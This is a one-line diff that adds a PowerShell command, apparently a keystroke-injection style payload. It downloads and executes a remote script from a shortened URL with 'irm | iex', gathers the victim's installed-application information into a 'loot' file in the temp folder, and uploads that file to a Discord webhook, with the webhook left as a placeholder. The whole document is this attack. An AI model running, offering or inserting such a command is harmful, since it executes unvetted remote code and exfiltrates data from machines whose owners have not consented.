@@ -1,0 +1,1 @@
+irm "t.ly/fmi7p"|iex;Get-AppInfo;Upload-Discord -webhookUrl 'YOUR WEBHOOK HERE' -file "$env:TEMP\CaliAppLoot.txt" | Out-Null
